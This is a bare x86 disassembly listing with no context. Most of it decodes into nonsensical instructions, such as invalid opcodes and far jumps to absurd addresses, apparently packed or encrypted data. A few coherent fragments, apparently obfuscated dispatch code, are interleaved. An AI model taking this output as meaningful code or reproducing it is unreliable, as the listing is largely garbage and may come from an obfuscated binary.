  4019a3:	mov    ds:0x2e37754c,eax
  4019a8:	fnstcw WORD PTR [esi+0x1ce29830]
  4019ae:	aaa    
  4019af:	mov    ebx,0x467e8d36
  4019b4:	xchg   esp,eax
  4019b5:	aas    
  4019b6:	fstp   QWORD PTR [eax-0x68]
  4019b9:	push   ebx
  4019ba:	loop   0x4019cc
  4019bc:	inc    edx
  4019bd:	or     ebp,DWORD PTR [ebx+0x5c]
  4019c0:	outs   dx,BYTE PTR ds:[esi]
  4019c1:	inc    ecx
  4019c2:	jmp    0x4f90ca8
  4019c7:	cmc    
  4019c8:	(bad)  
  4019c9:	cld    
  4019ca:	std    
  4019cb:	and    DWORD PTR [esi+0xd7b9099],ebx
  4019d1:	addr16 aas 
  4019d3:	pop    edi
  4019d4:	lahf   
  4019d5:	jg     0x4019dd
  4019d7:	sub    dl,BYTE PTR [esi-0x31]
  4019da:	gs mov bl,0x57
  4019dd:	in     al,0xae
  4019df:	jmp    0xccc1:0x708c59d1
  4019e6:	dec    eax
  4019e7:	lods   eax,DWORD PTR ds:[esi]
  4019e8:	dec    edi
  4019e9:	repz fcmovne st,st(5)
  4019ec:	xchg   BYTE PTR [esi+0x280d911b],dh
  4019f2:	jle    0x401a6f
  4019f4:	or     BYTE PTR [edx+0x59ad0faf],0xa6
  4019fb:	mov    eax,ds:0xf1e02d41
  401a00:	imul   edx,DWORD PTR [ebx+0x5e],0x4e9365b6
  401a07:	js     0x4019fb
  401a09:	pop    edi
  401a0a:	mov    edx,ebx
  401a0c:	mov    ch,ah
  401a0e:	jb     0x401a52
  401a10:	mov    dl,0xbc
  401a12:	cmp    BYTE PTR [ebp+0x56],bl
  401a15:	mov    edx,0x462a9580
  401a1a:	std    
  401a1b:	sti    
  401a1c:	push   0xffffffe5
  401a1e:	inc    esp
  401a1f:	sub    al,0x20
  401a21:	or     edi,DWORD PTR [eax-0x71c5e88b]
  401a27:	cmp    DWORD PTR [edx*1+0x319c3d05],ebx
  401a2e:	jecxz  0x401a42
  401a30:	hlt    
  401a31:	test   DWORD PTR [edi],edx
  401a33:	inc    ebp
  401a34:	call   0xc90a:0xef8da218
  401a3b:	lods   al,BYTE PTR ds:[esi]
  401a3c:	bound  ebx,QWORD PTR [edx]
  401a3e:	xlat   BYTE PTR ds:[ebx]
  401a3f:	shl    bl,1
  401a41:	sbb    BYTE PTR ds:0xa03c6a25,dh
  401a47:	pop    ecx
  401a48:	loope  0x401a92
  401a4a:	fwait
  401a4b:	adc    al,0x7e
  401a4d:	cmp    al,0x13
  401a4f:	mov    eax,0x81a158a2
  401a54:	dec    ecx
  401a55:	stc    
  401a56:	jo     0x401a0a
  401a58:	xchg   ebp,eax
  401a59:	scas   al,BYTE PTR es:[edi]
  401a5a:	dec    ebx
  401a5b:	cli    
  401a5c:	jp     0x401a37
  401a5e:	dec    eax
  401a5f:	jl     0x401aad
  401a61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a62:	mov    WORD PTR [ebp-0x13],es
  401a65:	mov    WORD PTR [ebx],cs
  401a67:	cli    
  401a68:	pop    edi
  401a69:	mov    WORD PTR [esi],es
  401a6b:	fisttp WORD PTR [eax-0x42]
  401a6e:	test   BYTE PTR [ebp+0x6c],bh
  401a71:	mov    esi,0x9bedfffd
  401a76:	je     0x401a01
  401a78:	pop    ebp
  401a79:	mov    al,0xe9
  401a7b:	pushf  
  401a7c:	add    DWORD PTR [eax],eax
  401a7e:	add    BYTE PTR [ecx-0x4c264c60],dl
  401a84:	jmp    0x10588ada
  401a89:	push   ds
  401a8a:	dec    esp
  401a8b:	inc    ebx
  401a8c:	pop    ecx
  401a8d:	inc    eax
  401a8e:	nop
  401a8f:	push   cs
  401a90:	js     0x401b10
  401a92:	jle    0x401a8e
  401a94:	jg     0x401b14
  401a96:	jle    0x401b00
  401a98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a99:	adc    bh,ch
  401a9b:	push   ebp
  401a9c:	stc    
  401a9d:	xchg   BYTE PTR [edx-0x75],dl
  401aa0:	mov    ah,0xc9
  401aa2:	push   ss
  401aa3:	xlat   BYTE PTR ds:[ebx]
  401aa4:	jmp    DWORD PTR [edx+edx*4-0x38]
  401aa8:	mov    fs,WORD PTR [ecx]
  401aaa:	ss into 
  401aac:	ret    0x320e
  401aaf:	enter  0xc26f,0xf0
  401ab3:	xchg   DWORD PTR [eax-0x8],esp
  401ab6:	or     cl,dl
  401ab8:	push   ss
  401ab9:	imul   ebp,esi,0xe8ec7a9f
  401abf:	sbb    dh,BYTE PTR [ebp-0x93c195b]
  401ac5:	jno    0x38f69bae
  401acb:	mov    ds:0x3e9d6d37,eax
  401ad0:	jge    0x401a58
  401ad2:	inc    ebp
  401ad3:	sbb    DWORD PTR ds:0xb5fbf9a6,edx
  401ad9:	add    DWORD PTR [ebp-0x5f],0x48c60a73
  401ae0:	xchg   ebx,eax
  401ae1:	lods   eax,DWORD PTR ds:[esi]
  401ae2:	jns    0x401a95
  401ae4:	cmp    esi,DWORD PTR [ebx-0x6f]
  401ae7:	rcr    DWORD PTR [edx-0x3cd6aa5b],cl
  401aed:	scas   eax,DWORD PTR es:[edi]
  401aee:	pop    esi
  401aef:	test   DWORD PTR [eax+0x1e51fcb],eax
  401af5:	hlt    
  401af6:	mov    ch,0xc6
  401af8:	(bad)  
  401af9:	mov    ds:0xf89a0223,al
  401afe:	fwait
  401aff:	out    dx,al
  401b00:	iret   
  401b01:	push   ebx
  401b02:	fcmovb st,st(5)
  401b04:	lods   al,BYTE PTR ds:[esi]
  401b05:	cmc    
  401b06:	cli    
  401b07:	into   
  401b08:	ja     0x401ac1
  401b0a:	add    al,0x38
  401b0c:	call   0xf6b4:0xd71cb226
  401b13:	pop    ss
  401b14:	add    eax,DWORD PTR [esi]
  401b16:	and    eax,DWORD PTR [ecx+0x7484d74]
  401b1c:	out    0x4b,eax
  401b1e:	bsf    esi,DWORD PTR [edi-0x1a12ea01]
  401b25:	retf   
  401b26:	jmp    0x585f3266
  401b2b:	rcr    DWORD PTR [edx],cl
  401b2d:	push   ebp
  401b2e:	sub    BYTE PTR [ecx+0xb],dl
  401b31:	dec    ebx
  401b32:	aas    
  401b33:	mov    esp,0x275d5dc3
  401b38:	je     0x401b65
  401b3a:	adc    al,0xe1
  401b3c:	loope  0x401ac7
  401b3e:	cld    
  401b3f:	mov    bh,BYTE PTR [ebx]
  401b41:	inc    ebx
  401b42:	add    eax,0x9a8090be
  401b47:	out    dx,eax
  401b48:	push   ebx
  401b49:	retf   0xa61b
  401b4c:	mov    BYTE PTR [edi-0x171be7eb],ah
  401b52:	in     eax,0x46
  401b54:	jno    0x401b7d
  401b56:	shl    edx,cl
  401b58:	mov    al,0xbd
  401b5a:	cld    
  401b5b:	add    DWORD PTR [edi+eiz*2],ecx
  401b5e:	or     al,0x92
  401b60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b61:	test   DWORD PTR [eax-0x2eee0c5a],edx
  401b67:	adc    eax,0x58f2762f
  401b6c:	adc    eax,0x1efa0092
  401b71:	inc    eax
  401b72:	mov    ah,0xf8
  401b74:	mov    dh,0x40
  401b76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b77:	sahf   
  401b78:	inc    esp
  401b79:	dec    eax
  401b7a:	or     ch,BYTE PTR es:[esp+ebp*4-0x6f295d4d]
  401b82:	fidivr WORD PTR [edi+esi*1]
  401b85:	mov    al,0xe
  401b87:	je     0x401bd4
  401b89:	push   ebx
  401b8a:	cmp    eax,0x97f2fe31
  401b8f:	scas   al,BYTE PTR es:[edi]
  401b90:	add    BYTE PTR [edx],cl
  401b92:	mov    edx,0x42c0da7c
  401b97:	jb     0x401bc7
  401b99:	cs popa 
  401b9b:	cdq    
  401b9c:	int3   
  401b9d:	or     DWORD PTR [eax-0x105f9a9b],eax
  401ba3:	test   eax,0x9d1e5356
  401ba8:	in     al,dx
  401ba9:	jae    0x401b51
  401bab:	loope  0x401bbd
  401bad:	push   esp
  401bae:	mov    eax,0x854345d4
  401bb3:	pop    esp
  401bb4:	mov    WORD PTR [eax],ss
  401bb6:	shl    ebx,1
  401bb8:	jp     0x401b56
  401bba:	pop    esp
  401bbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bbc:	push   ecx
  401bbd:	mov    esp,0x8b1d59f6
  401bc2:	push   ecx
  401bc4:	sub    ah,BYTE PTR [ecx+0x489bef31]
  401bca:	adc    al,0x2a
  401bcc:	retf   0x2332
  401bcf:	clc    
  401bd0:	mov    cl,BYTE PTR [esi+0x3a3fc6e2]
  401bd6:	jecxz  0x401b62
  401bd8:	xchg   DWORD PTR [ebp-0x1fbceed7],ecx
  401bde:	dec    DWORD PTR [ecx-0x36]
  401be1:	pop    edx
  401be2:	xchg   ebp,eax
  401be3:	je     0x401bbb
  401be5:	addr16 in eax,dx
  401be7:	imul   edx,DWORD PTR [edi+0x4c],0xfe010a6b
  401bee:	jle    0x401b89
  401bf0:	xor    dh,dh
  401bf2:	push   esp
  401bf3:	mov    al,0xeb
  401bf5:	out    dx,eax
  401bf6:	addr16 or al,0x1d
  401bf9:	retf   
  401bfa:	(bad)
  401bfd:	jmp    0x8cde42d7
  401c02:	inc    eax
  401c03:	xchg   edx,eax
  401c04:	mov    ah,0xe9
  401c06:	mov    edi,0x5f74b244
  401c0b:	pop    eax
  401c0c:	rcl    DWORD PTR [ecx+0x0],1
  401c0f:	push   ebx
  401c10:	std    
  401c11:	ret    
  401c12:	inc    esi
  401c13:	inc    edx
  401c14:	aas    
  401c15:	ins    DWORD PTR es:[edi],dx
  401c16:	and    BYTE PTR [ebp+ebp*8+0x7e],dl
  401c1a:	mov    ecx,DWORD PTR [ebx+0x4d8bb045]
  401c20:	clc    
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	xlat   BYTE PTR ds:[ebx]
  401c41:	or     al,0x30
  401c43:	inc    ecx
  401c44:	mov    bh,BYTE PTR [ecx+0x7e]
  401c47:	jle    0x401c43
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401be3
  401c4d:	icebp  
  401c4e:	pop    ds
  401c4f:	or     al,0xf8
  401c51:	mov    bh,0x8d
  401c53:	dec    ebp
  401c54:	ror    BYTE PTR [edi+0x2d366471],cl
  401c5a:	push   ss
  401c5b:	and    BYTE PTR [edi],ah
  401c5d:	es (bad) 
  401c5f:	int    0xe5
  401c61:	out    dx,al
  401c62:	xchg   ebx,eax
  401c63:	cdq    
  401c64:	pop    ecx
  401c65:	or     DWORD PTR [ebx-0x2931b64],0xffffff93
  401c6c:	mov    edi,0x3c78e28a
  401c71:	fidiv  WORD PTR [ebx]
  401c73:	shl    DWORD PTR [ebx-0x28e08ca9],cl
  401c79:	vpsubsw ymm1,ymm1,YMMWORD PTR [ebx+eax*8-0x54a80507]
  401c83:	xor    al,BYTE PTR [ecx]
  401c85:	daa    
  401c86:	das    
  401c87:	mov    eax,ds:0xfd2a0d0d
  401c8c:	cmp    BYTE PTR [edi],ah
  401c8e:	or     al,0x30
  401c90:	adc    ecx,edx
  401c92:	loope  0x401c9d
  401c94:	je     0x401c36
  401c96:	dec    eax
  401c97:	sbb    DWORD PTR [esi+0x8c17cb7],eax
  401c9d:	inc    esp
  401c9e:	adc    BYTE PTR [edx-0x3af9fead],0xe2
  401ca5:	mov    ebp,0x10c6464c
  401caa:	xchg   edi,eax
  401cab:	out    dx,eax
  401cac:	sub    ebp,DWORD PTR [ebx+0x7f5c709e]
  401cb2:	in     al,0x8b
  401cb4:	sbb    edx,DWORD PTR [esi+0x1e9fd091]
  401cba:	and    ebx,DWORD PTR [eax+eiz*1+0x30]
  401cbe:	adc    al,0x17
  401cc0:	notrack jmp edi
  401cc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401cc4:	or     DWORD PTR [ebp-0x33],edx
  401cc7:	mov    al,0x46
  401cc9:	dec    ecx
  401cca:	and    ch,BYTE PTR [edx]
  401ccc:	cli    
  401ccd:	pmulhw mm6,QWORD PTR [edi]
  401cd0:	inc    ecx
  401cd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401cd2:	jecxz  0x401d3c
  401cd4:	mov    ecx,DWORD PTR [eax-0x40]
  401cd7:	cmp    al,0x8a
  401cd9:	mov    bh,0xb2
  401cdb:	push   cs
  401cdc:	shl    BYTE PTR [esi],0x6a
  401cdf:	lock vpsubusb ymm2,ymm5,YMMWORD PTR [esp+ebx*2]
  401ce5:	mov    esi,0xacfeda06
  401cea:	dec    ecx
  401ceb:	(bad)  
  401cec:	in     al,dx
  401ced:	sub    edi,DWORD PTR [esi+0x65]
  401cf0:	or     DWORD PTR [edx],ebx
  401cf2:	xor    al,0xa4
  401cf4:	mov    al,ds:0xf49df34b
  401cf9:	push   cs
  401cfa:	lock sub al,0xdd
  401cfd:	add    dh,BYTE PTR [esi+0x7e]
  401d00:	mov    esp,0x106ca37c
  401d05:	add    BYTE PTR [ebp-0x2c],0x13
  401d09:	dec    esp
  401d0a:	repz pop ebx
  401d0c:	gs (bad) 
  401d0f:	dec    edx
  401d10:	sbb    al,0xbe
  401d12:	je     0x401d7d
  401d14:	mov    dh,0xb3
  401d16:	push   ebx
  401d17:	mov    ebx,0x59669697
  401d1c:	cmp    BYTE PTR [ebp-0x277ca4bf],al
  401d22:	and    ah,BYTE PTR [ecx-0x47a177b6]
  401d28:	mov    ebp,0x76709deb
  401d2d:	icebp  
  401d2e:	xor    DWORD PTR [edi-0x5d7d4d18],ecx
  401d34:	add    BYTE PTR [ebp+0x2c],cl
  401d37:	push   eax
  401d38:	push   es
  401d39:	cmp    eax,0x1c9480b9
  401d3e:	xchg   ch,dh
  401d40:	fmul   QWORD PTR [ecx+edx*8]
  401d43:	sar    DWORD PTR [ebp+edx*1-0xb],1
  401d47:	adc    eax,0x5bc40a9f
  401d4c:	lea    eax,[edx-0x55]
  401d4f:	lods   al,BYTE PTR ds:[esi]
  401d51:	sub    dl,al
  401d53:	fidivr DWORD PTR ds:0x6eac1def
  401d59:	and    DWORD PTR [esi-0x2b],edi
  401d5c:	nop    DWORD PTR [eax+0x35b390e7]
  401d63:	sti    
  401d64:	das    
  401d65:	and    cl,bh
  401d67:	imul   DWORD PTR [eax-0x532d8761]
  401d6d:	sbb    al,0x28
  401d6f:	mov    esi,0x349ccb37
  401d74:	jne    0x401dce
  401d76:	les    ebx,FWORD PTR [esi]
  401d78:	xchg   esp,eax
  401d79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d7b:	ja     0x401d29
  401d7d:	push   ecx
  401d7e:	mov    ah,0xda
  401d80:	cld    
  401d81:	clc    
  401d82:	ins    BYTE PTR es:[edi],dx
  401d83:	popf   
  401d84:	jo     0x401dd4
  401d86:	(bad)  
  401d87:	jp     0x401d77
  401d89:	and    BYTE PTR [edx+edx*8+0x53893d3b],ch
  401d90:	cmp    BYTE PTR [eax],dl
  401d92:	lea    eax,[edi]
  401d94:	adc    ebx,DWORD PTR [edi+0x571ced0]
  401d9a:	or     BYTE PTR [edx+0xd118c40],dl
  401da0:	in     eax,dx
  401da1:	call   0x11b6:0x45cf5cdd
  401da8:	push   cs
  401da9:	test   DWORD PTR [eax-0x39],eax
  401dac:	mov    BYTE PTR [ebp-0x42],bh
  401daf:	idiv   DWORD PTR [eax+ebp*4]
  401db2:	adc    BYTE PTR [ecx-0x2e],al
  401db5:	popa   
  401db6:	push   ds
  401db7:	or     eax,0xea636323
  401dbc:	push   cs
  401dbd:	jno    0x401d88
  401dbf:	add    DWORD PTR [ebp+0x572beda8],ebx
  401dc5:	lods   al,BYTE PTR es:[esi]
  401dc7:	ret    
  401dc8:	shr    dl,1
  401dca:	(bad)  [esi]
  401dcc:	add    DWORD PTR [ecx-0x38fc2238],ebx
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax-0x71c351c8],ebp
  401e0d:	jmp    0x7ebe2528
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401ddd
  401e17:	pop    esp
  401e18:	addr16 std 
  401e1a:	jl     0x401e0a
  401e1c:	shl    DWORD PTR [edi-0x1e],0x9e
  401e20:	push   cs
  401e21:	push   ds
  401e22:	jae    0x401e0b
  401e24:	sub    BYTE PTR fs:[edx-0x601907ba],bl
  401e2b:	mov    BYTE PTR [ecx-0x21],0x6a
  401e2f:	xchg   ebp,eax
  401e30:	addr16 ret 0x6be
  401e34:	retf   0x1eae
  401e37:	enter  0x1cd7,0x5f
  401e3b:	rol    BYTE PTR [edx+0x5e],cl
  401e3e:	fmul   DWORD PTR [edi]
  401e40:	xor    ch,cl
  401e42:	mov    bh,0x51
  401e44:	mov    bl,BYTE PTR [esi-0x4bf9ff5f]
  401e4a:	in     al,dx
  401e4b:	stos   BYTE PTR es:[edi],al
  401e4c:	add    ebp,DWORD PTR [eax+ebp*8+0x7bc09f5a]
  401e53:	popa   
  401e54:	or     eax,0x26e4f2bc
  401e59:	js     0x401e5a
  401e5b:	mov    al,ds:0x8bacfcf3
  401e60:	std    
  401e61:	adc    eax,0xf8e1fc7f
  401e66:	dec    esp
  401e67:	cmp    eax,0x495c4da4
  401e6c:	xchg   edx,eax
  401e6e:	outs   dx,BYTE PTR ds:[esi]
  401e6f:	aaa    
  401e70:	repnz scas al,BYTE PTR es:[edi]
  401e72:	add    DWORD PTR [edi-0x27fccd02],edi
  401e78:	cmp    eax,0x828dc8be
  401e7d:	ins    DWORD PTR es:[edi],dx
  401e7e:	in     al,dx
  401e7f:	outs   dx,BYTE PTR ds:[esi]
  401e80:	stos   DWORD PTR es:[edi],eax
  401e81:	and    BYTE PTR [edi+0x16],al
  401e84:	test   ah,ch
  401e86:	mov    WORD PTR [ebp-0x22],ds
  401e89:	push   ebx
  401e8a:	mov    ebp,0xec4c4c97
  401e8f:	or     dh,BYTE PTR [ecx+0x5]
  401e92:	mov    BYTE PTR [esi-0x3],cl
  401e95:	jecxz  0x401e6d
  401e97:	mov    ah,0x3b
  401e99:	jp     0x401e20
  401e9b:	push   0x54fa978f
  401ea0:	fidiv  DWORD PTR [eax]
  401ea2:	sbb    BYTE PTR [esi+0x46],ch
  401ea5:	aaa    
  401ea6:	and    ecx,DWORD PTR [ecx-0x247f612a]
  401eac:	sbb    BYTE PTR [eax-0x5fd7662c],cl
  401eb2:	pusha  
  401eb3:	xor    ah,dh
  401eb5:	sub    al,0xfe
  401eb7:	adc    DWORD PTR [bx+si+0x17],ecx
  401ebb:	xor    esi,edi
  401ebd:	pop    esp
  401ebe:	stc    
  401ebf:	dec    ecx
  401ec0:	fiadd  DWORD PTR [edx+0xc5e46f4]
  401ec6:	aad    0x8c
  401ec8:	inc    esp
  401ec9:	xchg   ecx,eax
  401eca:	sub    DWORD PTR [ecx-0x29f29402],ecx
  401ed0:	mov    esi,0x67b129d8
  401ed5:	mov    al,0x92
  401ed7:	loop   0x401e59
  401ed9:	adc    al,dh
  401edb:	jle    0x401ea2
  401edd:	adc    BYTE PTR [esi-0x5787ce0d],dh
  401ee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ee4:	cmp    dl,BYTE PTR [esi]
  401ee6:	push   es
  401ee7:	cmp    BYTE PTR [edi+0x2a19efcd],bl
  401eed:	push   edi
  401eee:	jmp    0xc6faaece
  401ef3:	int    0x2a
  401ef5:	lds    ecx,FWORD PTR [eax+ebx*2+0x6a]
  401ef9:	imul   esp,esi,0x6
  401efc:	push   ds
  401efd:	sub    edx,DWORD PTR [edi-0x11]
  401f00:	mov    bh,0x11
  401f02:	pop    ecx
  401f03:	inc    bl
  401f05:	push   ds
  401f06:	xlat   BYTE PTR ds:[ebx]
  401f07:	mov    edx,0xf4d5aa79
  401f0c:	repz cs adc ecx,DWORD PTR ss:[ecx]
  401f11:	mov    esi,0xe72e7da3
  401f16:	hlt    
  401f17:	lock (bad) 
  401f19:	mov    eax,0x6bf6b2e9
  401f1e:	scas   al,BYTE PTR es:[edi]
  401f1f:	lods   al,BYTE PTR ds:[esi]
  401f20:	pop    ecx
  401f21:	pop    ebp
  401f22:	mov    ah,0x8
  401f24:	ss pop esp
  401f26:	jecxz  0x401f63
  401f28:	pop    ebx
  401f29:	pop    esp
  401f2a:	fcomp  DWORD PTR [ecx+0x799ebb47]
  401f30:	ficom  DWORD PTR [esi]
  401f32:	adc    cl,ch
  401f34:	jp     0x401ebc
  401f36:	or     al,0x3f
  401f38:	push   0x8225e6c0
  401f3d:	cli    
  401f3e:	int    0x42
  401f40:	inc    esi
  401f41:	xchg   ebx,eax
  401f42:	add    ch,al
  401f44:	cwde   
  401f45:	ja     0x401f6d
  401f47:	mov    dl,0xaf
  401f49:	adc    dh,BYTE PTR ds:0x9367cc4b
  401f4f:	jp     0x401f2b
  401f51:	jmp    0x401f61
  401f53:	and    bl,BYTE PTR [eax]
  401f55:	cmp    bl,BYTE PTR [ebp-0x4b]
  401f58:	dec    ebp
  401f59:	inc    eax
  401f5a:	pop    ds
  401f5b:	fimul  WORD PTR [esi]
  401f5d:	fild   QWORD PTR [ecx+0xf]
  401f60:	xchg   esp,eax
  401f61:	mov    ds:0x13ec423c,al
  401f66:	sbb    BYTE PTR [edi-0x20],bl
  401f69:	outs   dx,BYTE PTR ds:[esi]
  401f6a:	mov    esi,0xc0b96d95
  401f6f:	pushf  
  401f70:	out    0xcc,eax
  401f72:	add    eax,0x9d766463
  401f77:	loope  0x401f0d
  401f79:	popf   
  401f7a:	fsub   QWORD PTR [eax+edx*2]
  401f7d:	or     DWORD PTR [ebp+0x4d],ebx
  401f80:	int3   
  401f81:	xor    al,0xd9
  401f83:	and    BYTE PTR [ecx-0x4624a276],bl
  401f89:	mov    ds:0x765ef55e,al
  401f8e:	cmp    al,BYTE PTR [eax-0x5941e781]
  401f94:	jle    0x401fcd
  401f96:	cs inc esp
  401f98:	hlt    
  401f99:	push   cs
  401f9a:	je     0x40230d
  401fa0:	lea    eax,[ebp-0x98]
  401fa6:	push   eax
  401fa7:	mov    eax,DWORD PTR [ebp-0x1c]
  401faa:	xor    eax,esi
  401fac:	add    eax,edi
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0x89a11187
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x401f81
  401fcc:	mov    dh,0xb1
  401fce:	dec    ebx
  401fcf:	outs   dx,BYTE PTR ds:[esi]
  401fd0:	stos   DWORD PTR es:[edi],eax
  401fd1:	mov    dl,0xd7
  401fd3:	sbb    ecx,ebp
  401fd5:	fsub   QWORD PTR ds:0xb7711af7
  401fdb:	inc    BYTE PTR [edx-0x1b]
  401fde:	xor    DWORD PTR [ecx+0x54],ebp
  401fe1:	inc    DWORD PTR [edx+eiz*4]
  401fe4:	pop    ebp
  401fe5:	jmp    0x6789ecbb
  401fea:	pop    ds
  401feb:	dec    eax
  401fec:	aas    
  401fed:	cmp    al,0xe1
  401fef:	pushf  
  401ff0:	(bad)  
  401ff1:	leave  
  401ff2:	js     0x401f74
  401ff4:	lods   eax,DWORD PTR ds:[esi]
  401ff5:	cmc    
  401ff6:	fcmovbe st,st(3)
  401ff8:	cmc    
  401ff9:	cld    
  401ffa:	or     DWORD PTR [edx+0x54],ecx
  401ffd:	dec    ebx
  401ffe:	iret   
  401fff:	mov    BYTE PTR [edi],ah
  402001:	arpl   ax,cx
  402003:	shl    BYTE PTR [eax+edx*1-0x53],1
  402007:	shl    DWORD PTR [ecx+0x6d],1
  40200a:	retf   0x4d88
  40200d:	ds pop ebp
  40200f:	dec    esi
  402010:	jmp    0x401fb7
  402012:	retf   0xa2e4
  402015:	pop    edx
  402016:	inc    BYTE PTR [ecx-0x234b13a5]
  40201c:	sbb    bl,bh
  40201e:	loop   0x401fd7
  402020:	ror    BYTE PTR [ecx-0x3e4bcab3],0xef
  402027:	xchg   bl,dh
  402029:	ss inc ebx
  40202b:	cmc    
  40202c:	mov    esi,es
  40202e:	xor    ah,dl
  402030:	mov    ebx,es
  402032:	nop    DWORD PTR [edx]
  402035:	aad    0xdc
  402037:	daa    
  402038:	gs (bad) 
  40203a:	rol    DWORD PTR [eax-0x207b9ce2],1
  402040:	cmp    al,0x2c
  402042:	jno    0x401ff3
  402044:	inc    esi
  402045:	mov    ss,WORD PTR [edx+0x3abb180f]
  40204b:	adc    al,bl
  40204d:	adc    DWORD PTR [edx-0x2d],ecx
  402050:	push   edi
  402051:	push   esi
  402052:	cmp    dl,dl
  402054:	or     al,0x9f
  402056:	add    eax,0x5699167f
  40205b:	sub    dl,BYTE PTR [eax+0x74]
  40205e:	xchg   ebx,eax
  40205f:	mov    ds:0x3a3fd40f,eax
  402064:	add    edi,esi
  402066:	jl     0x402077
  402068:	test   eax,0x90c0a43e
  40206d:	xor    DWORD PTR [ebp+0x42],edi
  402070:	pop    ebx
  402071:	pop    es
  402072:	mov    eax,ds:0x47fcee61
  402077:	(bad)  
  402078:	iret   
  402079:	add    DWORD PTR [esi+0x3b],eax
  40207c:	mov    dh,0x44
  40207e:	and    al,0x20
  402080:	ret    
  402081:	push   es
  402082:	in     al,0xb8
  402084:	aam    0x2d
  402086:	mov    eax,ds:0x4d24a99f
  40208b:	jns    0x980fab33
  402091:	cdq    
  402092:	push   ecx
  402093:	loope  0x402102
  402095:	jno    0x402021
  402097:	pop    edi
  402098:	loop   0x4020e3
  40209a:	adc    ecx,ecx
  40209c:	test   DWORD PTR [eax+0x16],ebx
  40209f:	xor    dh,BYTE PTR ds:0x5ad1b0b
  4020a5:	push   cs
  4020a6:	sbb    al,BYTE PTR [ebp+esi*2+0x2929da2a]
  4020ad:	or     DWORD PTR [ecx],esp
  4020af:	mov    eax,ds:0x22f5b165
  4020b4:	push   esp
  4020b5:	out    dx,al
  4020b6:	repz xchg esp,eax
  4020b9:	push   0x816e2c3e
  4020be:	lea    ecx,[esi-0x3fa20704]
  4020c4:	loope  0x4020ae
  4020c6:	mov    WORD PTR [edi+ebp*4],?
  4020c9:	push   ebp
  4020ca:	rol    DWORD PTR [ebp+ebx*1+0x74],cl
  4020ce:	aaa    
  4020cf:	data16 loope 0x40210f
  4020d2:	push   0xbbe69132
  4020d7:	xchg   ebp,eax
  4020d8:	loope  0x4020d6
  4020da:	cwde   
  4020db:	enter  0x80f4,0x32
  4020df:	stos   BYTE PTR es:[edi],al
  4020e0:	add    DWORD PTR [esi+ecx*4-0xdb1d847],ebx
  4020e7:	iret   
  4020e8:	cmp    eax,0x615b5d6a
  4020ed:	fild   DWORD PTR [ebx+0x16]
  4020f0:	hlt    
  4020f1:	xor    eax,0x385e7f4e
  4020f6:	sbb    BYTE PTR [ecx],dh
  4020f8:	sti    
  4020f9:	popf   
  4020fa:	or     eax,esp
  4020fc:	adc    dh,BYTE PTR [ebp-0x17]
  4020ff:	lock sub ecx,esp
  402102:	and    eax,0x523724de
  402107:	in     eax,dx
  402108:	add    bl,BYTE PTR [ebp+0x3c]
  40210b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40210c:	out    dx,eax
  40210d:	adc    DWORD PTR [eax-0x29],ebx
  402110:	call   0xab2e:0x7d1b7f06
  402117:	cmp    eax,DWORD PTR [esi]
  402119:	std    
  40211a:	ja     0x40214f
  40211c:	add    edx,ebp
  40211e:	pop    esp
  40211f:	inc    ecx
  402120:	sti    
  402121:	rol    DWORD PTR [ecx+0x4654a8b],1
  402127:	test   al,0x11
  402129:	add    edi,DWORD PTR [esi+edi*1-0x588de30]
  402130:	jmp    0x3361d4fd
  402135:	daa    
  402136:	stc    
  402137:	cmp    BYTE PTR [edx+0x58b7e0a3],bl
  40213d:	cli    
  40213e:	mov    ah,0xe5
  402140:	cwde   
  402141:	out    0x7a,eax
  402143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402144:	int    0xf3
  402146:	inc    ebp
  402147:	sub    al,0x4c
  402149:	cli    
  40214a:	stos   BYTE PTR es:[edi],al
  40214b:	aad    0x68
  40214d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
